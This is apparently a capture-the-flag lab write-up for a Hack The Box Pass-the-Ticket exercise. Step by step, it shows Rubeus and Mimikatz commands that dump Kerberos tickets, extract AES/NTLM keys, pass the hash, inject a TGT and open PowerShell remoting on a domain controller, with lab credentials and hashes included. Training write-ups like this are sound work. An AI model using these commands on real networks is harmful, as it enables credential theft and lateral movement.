```markdown
# Pass the Ticket (PtT) Attack | HTB Password Attacks
**Category:** HTB CPTS Certification Lab  
**Date:** January 2026

> ### 🛡️ Ethical Hacking Disclaimer
> *This write-up is for educational purposes only. All activities were performed in a controlled, private lab environment provided by Hack The Box (HTB). Unauthorized access to computer systems is illegal and unethical.*

---

## 1. Introduction
Pass the Ticket (PtT) is a post-exploitation technique where an attacker uses a stolen Kerberos ticket (TGT or TGS) to authenticate to a remote system without knowing the user’s plaintext password.

In this lab, we started with administrative access to a compromised member server (**MS01**). Our objective was to:
1. Enumerate cached Kerberos tickets.
2. Extract cryptographic key material (AES/NTLM) for a target user (**john**).
3. Move laterally to the Domain Controller (**DC01**) to retrieve sensitive flags.

---

## 2. Execution Phase

### Step 1: Access and Enumeration
We began by establishing a remote desktop connection to the target host `10.129.204.23` using the provided credentials.

```bash
xfreerdp3 /v:'10.129.204.23' /u:'Administrator' /p:'AnotherC0mpl3xP4$$'

```

Upon successful login, we launched a Command Prompt as Administrator and navigated to the tools directory (`C:\tools`). We utilized **Rubeus** to assess the current Kerberos state.

```cmd
Rubeus.exe dump /nowrap

```

**Findings:**

* **Computer Accounts:** Tickets ending in `$` (e.g., `MS01$@inlanefreight.htb`).
* **User Accounts:** We identified `john`, `julios`, and `david`.
* **Target:** We focused on `john@inlanefreight.htb`.

---

### Step 2: Harvesting Credentials & Accessing File Shares

With the target user identified, we used **Mimikatz** to extract the encryption keys.

```cmd
mimikatz.exe privilege::debug sekurlsa::ekeys

```

We extracted the **AES256** and **NTLM (RC4)** keys for `john`. We then performed a **Pass-the-Hash** attack to spawn a new command prompt running under john's context.

```cmd
sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2

```

From this new session, we verified access to the Domain Controller’s file share:

```cmd
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt

```

---

### Step 3: Lateral Movement via PowerShell Remoting

To gain **Remote Code Execution (RCE)** on the Domain Controller, we injected a valid TGT into our session using **Rubeus**.

**Command Breakdown:**

* `createnetonly`: Spawns a discrete process for the new credentials.
* `asktgt /ptt`: Requests and imports the ticket immediately.

```cmd
# Spawn a discrete process
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# In the new window, import the TGT using the AES256 key
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

```

Finally, we connected via PowerShell Remoting:

```powershell
Enter-PSSession -ComputerName DC01

```

---

## 3. Conclusion

This lab demonstrated how compromising a single endpoint allows an attacker to harvest material from memory and pivot deeper into a network. Using **Mimikatz** for Overpass-the-Hash and **Rubeus** for Pass-the-Ticket highlights why protecting privileged sessions is critical.

```

---

